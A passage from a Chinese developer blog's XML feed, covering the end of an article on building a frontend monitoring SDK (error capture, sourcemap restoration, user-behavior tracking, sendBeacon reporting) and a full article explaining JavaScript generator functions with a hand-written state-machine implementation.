里进行渲染时间计算。所以需要添加一个 needCalculateRenderTime 字段，当切换路由时将它设为 true，代表可以计算渲染时间了。<br><a name="LvkSc"></a></p><h2 id="错误数据采集"><a href="#错误数据采集" class="headerlink" title="错误数据采集"></a>错误数据采集</h2><p><a name="tdu3q"></a></p><h3 id="资源加载错误"><a href="#资源加载错误" class="headerlink" title="资源加载错误"></a>资源加载错误</h3><p>使用 addEventListener() 监听 error 事件，可以捕获到资源加载失败错误。<br />&#x2F;&#x2F; 捕获资源加载失败错误 js css img… window.addEventListener(‘error’, e &#x3D;&gt; { const target &#x3D; e.target if (!target) return if (target.src || target.href) { const url &#x3D; target.src || target.href lazyReportCache({ url, type: ‘error’, subType: ‘resource’, startTime: e.timeStamp, html: target.outerHTML, resourceType: target.tagName, paths: e.path.map(item &#x3D;&gt; item.tagName).filter(Boolean), pageURL: getPageURL(), }) } }, true) 复制代码<br><a name="yfrCH"></a></p><h3 id="js-错误"><a href="#js-错误" class="headerlink" title="js 错误"></a>js 错误</h3><p>使用 window.onerror 可以监听 js 错误。<br />&#x2F;&#x2F; 监听 js 错误 window.onerror &#x3D; (msg, url, line, column, error) &#x3D;&gt; { lazyReportCache({ msg, line, column, error: error.stack, subType: ‘js’, pageURL: url, type: ‘error’, startTime: performance.now(), }) } 复制代码<br><a name="YQnRt"></a></p><h3 id="promise-错误"><a href="#promise-错误" class="headerlink" title="promise 错误"></a>promise 错误</h3><p>使用 addEventListener() 监听 unhandledrejection 事件，可以捕获到未处理的 promise 错误。<br />&#x2F;&#x2F; 监听 promise 错误 缺点是获取不到列数据 window.addEventListener(‘unhandledrejection’, e &#x3D;&gt; { lazyReportCache({ reason: e.reason?.stack, subType: ‘promise’, type: ‘error’, startTime: e.timeStamp, pageURL: getPageURL(), }) }) 复制代码<br><a name="AlrmF"></a></p><h3 id="sourcemap"><a href="#sourcemap" class="headerlink" title="sourcemap"></a>sourcemap</h3><p>一般生产环境的代码都是经过压缩的，并且生产环境不会把 sourcemap 文件上传。所以生产环境上的代码报错信息是很难读的。因此，我们可以利用 <a href="https://link.juejin.cn/?target=https://github.com/mozilla/source-map">source-map</a> 来对这些压缩过的代码报错信息进行还原。<br />当代码报错时，我们可以获取到对应的文件名、行数、列数:<br />{ line: 1, column: 17, file: ‘https:&#x2F;<a href="http://www.xxx.com/bundlejs">www.xxx.com/bundlejs</a>‘, } 复制代码<br />然后调用下面的代码进行还原：<br />async function parse(error) { const mapObj &#x3D; JSON.parse(getMapFileContent(error.url)) const consumer &#x3D; await new sourceMap.SourceMapConsumer(mapObj) &#x2F;&#x2F; 将 webpack:&#x2F;&#x2F;source-map-demo&#x2F;.&#x2F;src&#x2F;index.js 文件中的 .&#x2F; 去掉 const sources &#x3D; mapObj.sources.map(item &#x3D;&gt; format(item)) &#x2F;&#x2F; 根据压缩后的报错信息得出未压缩前的报错行列数和源码文件 const originalInfo &#x3D; consumer.originalPositionFor({ line: error.line, column: error.column }) &#x2F;&#x2F; sourcesContent 中包含了各个文件的未压缩前的源码，根据文件名找出对应的源码 const originalFileContent &#x3D; mapObj.sourcesContent[sources.indexOf(originalInfo.source)] return { file: originalInfo.source, content: originalFileContent, line: originalInfo.line, column: originalInfo.column, msg: error.msg, error: error.error } } function format(item) { return item.replace(&#x2F;(./)*&#x2F;g, ‘’) } function getMapFileContent(url) { return fs.readFileSync(path.resolve(__dirname, <code>./maps/$&#123;url.split(&#39;/&#39;).pop()&#125;.map</code>), ‘utf-8’) } 复制代码<br />每次项目打包时，如果开启了 sourcemap，那么每一个 js 文件都会有一个对应的 map 文件。<br />bundle.js bundle.js.map 复制代码<br />这时 js 文件放在静态服务器上供用户访问，map 文件存储在服务器，用于还原错误信息。source-map 库可以根据压缩过的代码报错信息还原出未压缩前的代码报错信息。例如压缩后报错位置为 1 行 47 列，还原后真正的位置可能为 4 行 10 列。除了位置信息，还可以获取到源码原文。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217143143-8d961072-2087-4a38-b8d0-c1462785f5f0.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217143143-8d961072-2087-4a38-b8d0-c1462785f5f0.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"> 来做这个事，有兴趣可以看看。<br><a name="mMKsQ"></a></p><h3 id="Vue-错误"><a href="#Vue-错误" class="headerlink" title="Vue 错误"></a>Vue 错误</h3><p>利用 window.onerror 是捕获不到 Vue 错误的，它需要使用 Vue 提供的 API 进行监听。<br />Vue.config.errorHandler &#x3D; (err, vm, info) &#x3D;&gt; { &#x2F;&#x2F; 将报错信息打印到控制台 console.error(err) lazyReportCache({ info, error: err.stack, subType: ‘vue’, type: ‘error’, startTime: performance.now(), pageURL: getPageURL(), }) } 复制代码<br><a name="DdVpm"></a></p><h2 id="行为数据采集"><a href="#行为数据采集" class="headerlink" title="行为数据采集"></a>行为数据采集</h2><p><a name="znw8q"></a></p><h3 id="PV、UV"><a href="#PV、UV" class="headerlink" title="PV、UV"></a>PV、UV</h3><p>PV(page view) 是页面浏览量，UV(Unique visitor)用户访问量。PV 只要访问一次页面就算一次，UV 同一天内多次访问只算一次。<br />对于前端来说，只要每次进入页面上报一次 PV 就行，UV 的统计放在服务端来做，主要是分析上报的数据来统计得出 UV。<br />export default function pv() { lazyReportCache({ type: ‘behavior’, subType: ‘pv’, startTime: performance.now(), pageURL: getPageURL(), referrer: document.referrer, uuid: getUUID(), }) } 复制代码<br><a name="XrC5N"></a></p><h3 id="页面停留时长"><a href="#页面停留时长" class="headerlink" title="页面停留时长"></a>页面停留时长</h3><p>用户进入页面记录一个初始时间，用户离开页面时用当前时间减去初始时间，就是用户停留时长。这个计算逻辑可以放在 beforeunload 事件里做。<br />export default function pageAccessDuration() { onBeforeunload(() &#x3D;&gt; { report({ type: ‘behavior’, subType: ‘page-access-duration’, startTime: performance.now(), pageURL: getPageURL(), uuid: getUUID(), }, true) }) } 复制代码<br><a name="VASmF"></a></p><h3 id="页面访问深度"><a href="#页面访问深度" class="headerlink" title="页面访问深度"></a>页面访问深度</h3><p>记录页面访问深度是很有用的，例如不同的活动页面 a 和 b。a 平均访问深度只有 50%，b 平均访问深度有 80%，说明 b 更受用户喜欢，根据这一点可以有针对性的修改 a 活动页面。<br />除此之外还可以利用访问深度以及停留时长来鉴别电商刷单。例如有人进来页面后一下就把页面拉到底部然后等待一段时间后购买，有人是慢慢的往下滚动页面，最后再购买。虽然他们在页面的停留时间一样，但明显第一个人更像是刷单的。<br />页面访问深度计算过程稍微复杂一点：</p><ol><li>用户进入页面时，记录当前时间、scrollTop 值、页面可视高度、页面总高度。</li><li>用户滚动页面的那一刻，会触发 scroll 事件，在回调函数中用第一点得到的数据算出页面访问深度和停留时长。</li><li>当用户滚动页面到某一点时，停下继续观看页面。这时记录当前时间、scrollTop 值、页面可视高度、页面总高度。</li><li>重复第二点…</li></ol><p>具体代码请看：<br />let timer let startTime &#x3D; 0 let hasReport &#x3D; false let pageHeight &#x3D; 0 let scrollTop &#x3D; 0 let viewportHeight &#x3D; 0 export default function pageAccessHeight() { window.addEventListener(‘scroll’, onScroll) onBeforeunload(() &#x3D;&gt; { const now &#x3D; performance.now() report({ startTime: now, duration: now - startTime, type: ‘behavior’, subType: ‘page-access-height’, pageURL: getPageURL(), value: toPercent((scrollTop + viewportHeight) &#x2F; pageHeight), uuid: getUUID(), }, true) }) &#x2F;&#x2F; 页面加载完成后初始化记录当前访问高度、时间 executeAfterLoad(() &#x3D;&gt; { startTime &#x3D; performance.now() pageHeight &#x3D; document.documentElement.scrollHeight || document.body.scrollHeight scrollTop &#x3D; document.documentElement.scrollTop || document.body.scrollTop viewportHeight &#x3D; window.innerHeight }) } function onScroll() { clearTimeout(timer) const now &#x3D; performance.now() if (!hasReport) { hasReport &#x3D; true lazyReportCache({ startTime: now, duration: now - startTime, type: ‘behavior’, subType: ‘page-access-height’, pageURL: getPageURL(), value: toPercent((scrollTop + viewportHeight) &#x2F; pageHeight), uuid: getUUID(), }) } timer &#x3D; setTimeout(() &#x3D;&gt; { hasReport &#x3D; false startTime &#x3D; now pageHeight &#x3D; document.documentElement.scrollHeight || document.body.scrollHeight scrollTop &#x3D; document.documentElement.scrollTop || document.body.scrollTop viewportHeight &#x3D; window.innerHeight }, 500) } function toPercent(val) { if (val &gt;&#x3D; 1) return ‘100%’ return (val * 100).toFixed(2) + ‘%’ } 复制代码<br><a name="Y4y4I"></a></p><h3 id="用户点击"><a href="#用户点击" class="headerlink" title="用户点击"></a>用户点击</h3><p>利用 addEventListener() 监听 mousedown、touchstart 事件，我们可以收集用户每一次点击区域的大小，点击坐标在整个页面中的具体位置，点击元素的内容等信息。<br />export default function onClick() { [‘mousedown’, ‘touchstart’].forEach(eventType &#x3D;&gt; { let timer window.addEventListener(eventType, event &#x3D;&gt; { clearTimeout(timer) timer &#x3D; setTimeout(() &#x3D;&gt; { const target &#x3D; event.target const { top, left } &#x3D; target.getBoundingClientRect() lazyReportCache({ top, left, eventType, pageHeight: document.documentElement.scrollHeight || document.body.scrollHeight, scrollTop: document.documentElement.scrollTop || document.body.scrollTop, type: ‘behavior’, subType: ‘click’, target: target.tagName, paths: event.path?.map(item &#x3D;&gt; item.tagName).filter(Boolean), startTime: event.timeStamp, pageURL: getPageURL(), outerHTML: target.outerHTML, innerHTML: target.innerHTML, width: target.offsetWidth, height: target.offsetHeight, viewport: { width: window.innerWidth, height: window.innerHeight, }, uuid: getUUID(), }) }, 500) }) }) } 复制代码<br><a name="DSIXl"></a></p><h3 id="页面跳转"><a href="#页面跳转" class="headerlink" title="页面跳转"></a>页面跳转</h3><p>利用 addEventListener() 监听 popstate、hashchange 页面跳转事件。需要注意的是调用 history.pushState()或 history.replaceState()不会触发 popstate 事件。只有在做出浏览器动作时，才会触发该事件，如用户点击浏览器的回退按钮（或者在 Javascript 代码中调用 history.back()或者 history.forward()方法）。同理，hashchange 也一样。<br />export default function pageChange() { let from &#x3D; ‘’ window.addEventListener(‘popstate’, () &#x3D;&gt; { const to &#x3D; getPageURL() lazyReportCache({ from, to, type: ‘behavior’, subType: ‘popstate’, startTime: performance.now(), uuid: getUUID(), }) from &#x3D; to }, true) let oldURL &#x3D; ‘’ window.addEventListener(‘hashchange’, event &#x3D;&gt; { const newURL &#x3D; event.newURL lazyReportCache({ from: oldURL, to: newURL, type: ‘behavior’, subType: ‘hashchange’, startTime: performance.now(), uuid: getUUID(), }) oldURL &#x3D; newURL }, true) } 复制代码<br><a name="wGJ7S"></a></p><h3 id="Vue-路由变更"><a href="#Vue-路由变更" class="headerlink" title="Vue 路由变更"></a>Vue 路由变更</h3><p>Vue 可以利用 router.beforeEach 钩子进行路由变更的监听。<br />export default function onVueRouter(router) { router.beforeEach((to, from, next) &#x3D;&gt; { &#x2F;&#x2F; 首次加载页面不用统计 if (!from.name) { return next() } const data &#x3D; { params: to.params, query: to.query, } lazyReportCache({ data, name: to.name || to.path, type: ‘behavior’, subType: [‘vue-router-change’, ‘pv’], startTime: performance.now(), from: from.fullPath, to: to.fullPath, uuid: getUUID(), }) next() }) } 复制代码<br><a name="FETNa"></a></p><h2 id="数据上报"><a href="#数据上报" class="headerlink" title="数据上报"></a>数据上报</h2><p><a name="oHjKH"></a></p><h3 id="上报方法"><a href="#上报方法" class="headerlink" title="上报方法"></a>上报方法</h3><p>数据上报可以使用以下几种方式：</p><ul><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator/sendBeacon">sendBeacon</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a></li><li>image</li></ul><p>我写的简易 SDK 采用的是第一、第二种方式相结合的方式进行上报。利用 sendBeacon 来进行上报的优势非常明显。<br />使用 <strong>sendBeacon()</strong> 方法会使用户代理在有机会时异步地向服务器发送数据，同时不会延迟页面的卸载或影响下一导航的载入性能。这就解决了提交分析数据时的所有的问题：数据可靠，传输异步并且不会影响下一页面的加载。<br />在不支持 sendBeacon 的浏览器下我们可以使用 XMLHttpRequest 来进行上报。一个 HTTP 请求包含发送和接收两个步骤。其实对于上报来说，我们只要确保能发出去就可以了。也就是发送成功了就行，接不接收响应无所谓。为此，我做了个实验，在 beforeunload 用 XMLHttpRequest 传送了 30kb 的数据（一般的待上报数据很少会有这么大），换了不同的浏览器，都可以成功发出去。当然，这和硬件性能、网络状态也是有关联的。<br><a name="WGbpV"></a></p><h3 id="上报时机"><a href="#上报时机" class="headerlink" title="上报时机"></a>上报时机</h3><p>上报时机有三种：</p><ol><li>采用 requestIdleCallback&#x2F;setTimeout 延时上报。</li><li>在 beforeunload 回调函数里上报。</li><li>缓存上报数据，达到一定数量后再上报。</li></ol><p>建议将三种方式结合一起上报：</p><ol><li>先缓存上报数据，缓存到一定数量后，利用 requestIdleCallback&#x2F;setTimeout 延时上报。</li><li>在页面离开时统一将未上报的数据进行上报。<br><a name="WgsFZ"></a></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>仅看理论知识是比较难以理解的，为此我结合本文所讲的技术要点写了一个简单的<a href="https://link.juejin.cn/?target=https://github.com/woai3c/monitor-demo">监控 SDK</a>，可以用它来写一些简单的 DEMO，帮助加深理解。再结合本文一起阅读，效果更好。<br><a name="fQRej"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a name="QE32N"></a></p><h3 id="性能监控"><a href="#性能监控" class="headerlink" title="性能监控"></a>性能监控</h3><ul><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/Performance_API">Performance API</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/PerformanceResourceTiming">PerformanceResourceTiming</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/Resource_Timing_API/Using_the_Resource_Timing_API">Using_the_Resource_Timing_API</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/PerformanceTiming">PerformanceTiming</a></li><li><a href="https://link.juejin.cn/?target=https://web.dev/metrics/">Metrics</a></li><li><a href="https://link.juejin.cn/?target=https://web.dev/evolving-cls/">evolving-cls</a></li><li><a href="https://link.juejin.cn/?target=https://web.dev/custom-metrics/">custom-metrics</a></li><li><a href="https://link.juejin.cn/?target=https://github.com/GoogleChrome/web-vitals">web-vitals</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/PerformanceObserver">PerformanceObserver</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/en-US/docs/Web/API/Element_timing_API">Element_timing_API</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/en-US/docs/Web/API/PerformanceEventTiming">PerformanceEventTiming</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Timing-Allow-Origin">Timing-Allow-Origin</a></li><li><a href="https://link.juejin.cn/?target=https://web.dev/bfcache/">bfcache</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/MutationObserver">MutationObserver</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a></li><li><a href="https://link.juejin.cn/?target=https://zhuanlan.zhihu.com/p/39292837">如何监控网页的卡顿</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator/sendBeacon">sendBeacon</a><br><a name="Xmp2u"></a></li></ul><h3 id="错误监控"><a href="#错误监控" class="headerlink" title="错误监控"></a>错误监控</h3><ul><li><a href="https://link.juejin.cn/?target=https://github.com/joeyguo/noerror">noerror</a></li><li><a href="https://link.juejin.cn/?target=https://github.com/mozilla/source-map">source-map</a><br><a name="MLtN4"></a></li></ul><h3 id="行为监控"><a href="#行为监控" class="headerlink" title="行为监控"></a>行为监控</h3><ul><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/Window/popstate_event">popstate</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/Window/hashchange_event">hashchange</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>generator函数生成器及其实现</title>
      <link href="/2023/04/24/frontend/interview/generator-han-shu-sheng-cheng-qi-ji-qi-shi-xian/"/>
      <url>/2023/04/24/frontend/interview/generator-han-shu-sheng-cheng-qi-ji-qi-shi-xian/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>调用生成器函数会返回一个生成器对象，每次调用生成器对象的 next 方法会执行函数到下一次 yield 关键字停止执行，并且返回一个 { value: Value, done: boolean }的对象。本质是协程在 ES6 的实现。<br><a name="lD80g"></a></p><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">gen</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> g = <span class="title function_">gen</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// &#123; value: 1, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// &#123; value: 2, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// &#123; value: 3, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure><ul><li>首先调用<code>gen()</code> 生成器函数返回 g 生成器对象。</li><li>其次返回的 g 生成器对象中拥有一个 next 的方法。</li><li><strong>每当我们调用</strong><code>**g.next()**</code><strong>方法时，生成器函数紧跟着上一次进行执行，直到函数碰到 yield 关键值。</strong></li><li>yield 关键字会停止函数执行并将 yield 后的值返回作为本次调用 next 函数的 value 进行返回。</li><li>同时，如果本次调用<code>g.next()</code>导致生成器函数执行完毕，那么此时 done 会变成 true 表示该函数执行完毕，反之则为 false 。<br><a name="De3nx"></a></li></ul><h1 id="进阶语法"><a href="#进阶语法" class="headerlink" title="进阶语法"></a>进阶语法</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">gen</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> a = <span class="keyword">yield</span> <span class="number">1</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a, <span class="string">&#x27;this is a&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> b = <span class="keyword">yield</span> <span class="number">2</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(b, <span class="string">&#x27;this is b&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> c = <span class="keyword">yield</span> <span class="number">3</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(c, <span class="string">&#x27;this is c&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;res&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> g = <span class="title function_">gen</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// 打印 &#123; value: 1, done: false &#125; </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="string">&#x27;param-a&#x27;</span>)); <span class="comment">// 打印 param-a this is a &#123; value: 2, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="string">&#x27;param-b&#x27;</span>)); <span class="comment">// 打印 param-b this is b &#123; value: 3, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="string">&#x27;param-c&#x27;</span>)); <span class="comment">// 打印 param-c this is c &#123; value: &#x27;res&#x27;, done: true &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// 打印 &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure><ul><li>定义一个生成器函数，并创建一个生成器对象。</li><li>第一次调用 <code>g.next()</code>方法时，函数执行到 <code>yield 1</code>并中断函数执行，由于代码中断，<code>a</code>的赋值语句并没有被执行。</li><li>第二次调用<code>g.next()</code>方法时，next接受传参传入一个字符串<code>param-a</code>，函数执行时从上一次中断的地方开始继续执行，也就是执行 <code>a</code>的赋值语句，从打印结果来看，<code>a</code>被赋值为字符<code>param-a</code>。</li><li>第三次调用<code>g.next()</code>方法并传入字符串<code>param-b</code>时，结果同样是变量<code>b</code>被赋值为<code>param-b</code>。</li><li>第四次调用<code>g.next()</code>方法与第二第三次的区别是，<code>return</code>语句作为返回值语句取代了<code>yield</code>语句，所以执行结果是<code>&#123; value: &#39;res&#39;, done: true &#125;</code>。</li><li>第五次调用<code>g.next()</code>，由于生成器函数已经执行完毕，所以打印<code>&#123; value: undefined, done: true &#125;</code>。</li></ul><p>从上述的分析中可以得出两个结论：</p><ol><li>当我们为 next 传递值进行调用时，传入的值会被当作上一次生成器函数暂停时 yield 关键字的返回值处理。</li><li>当生成器函数执行完毕时，原本本次调用 next 方法返回的<code>&#123;done:true,value:undefined&#125;</code>由于<code>return</code>语句变为了<code>&#123; done:true,value:&#39;res&#39;&#125;</code>。<br><a name="lmZhu"></a></li></ol><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">generatorWrap</span> = (<span class="params">fn</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> ctx = &#123;</span><br><span class="line">    <span class="attr">next</span>: <span class="number">0</span>, <span class="comment">// 表示下一次执行生成器函数状态机switch中的下标</span></span><br><span class="line">    <span class="attr">sent</span>: <span class="string">&quot;&quot;</span>, <span class="comment">// 表示next调用时候传入的值 作为上一次yield返回值</span></span><br><span class="line">    <span class="attr">done</span>: <span class="literal">false</span>, <span class="comment">// 是否完成</span></span><br><span class="line">    <span class="comment">// 完成函数</span></span><br><span class="line">    <span class="title function_">stop</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">done</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>(<span class="params">param</span>) &#123;</span><br><span class="line">      <span class="comment">// 1. 修改上一次yield返回值为context.sent</span></span><br><span class="line">      ctx.<span class="property">sent</span> = param;</span><br><span class="line">      <span class="comment">// 2.执行函数 获得本次返回值</span></span><br><span class="line">      <span class="keyword">const</span> value = <span class="title function_">fn</span>(ctx);</span><br><span class="line">      <span class="comment">// 3. 返回</span></span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">done</span>: ctx.<span class="property">done</span>,</span><br><span class="line">        value,</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gen</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> a, b, c;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">generatorWrap</span>(<span class="keyword">function</span> (<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> ((ctx.<span class="property">prev</span> = ctx.<span class="property">next</span>)) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ctx.<span class="property">next</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        a = ctx.<span class="property">sent</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(a, <span class="string">&#x27;this is a&#x27;</span>);</span><br><span class="line">        ctx.<span class="property">next</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        b = ctx.<span class="property">sent</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(b, <span class="string">&#x27;this is b&#x27;</span>);</span><br><span class="line">        ctx.<span class="property">next</span> = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        c = ctx.<span class="property">sent</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(c, <span class="string">&#x27;this is c&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;end&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> g = <span class="title function_">gen</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="string">&#x27;param-a&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="string">&#x27;param-b&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="string">&#x27;param-c&#x27;</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
            <tag> es6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDN</title>
      <link href="/2022/12/12/frontend/browser/cdn/"/>
      <url>/2022/12/12/frontend/browser/cdn/</url>
      
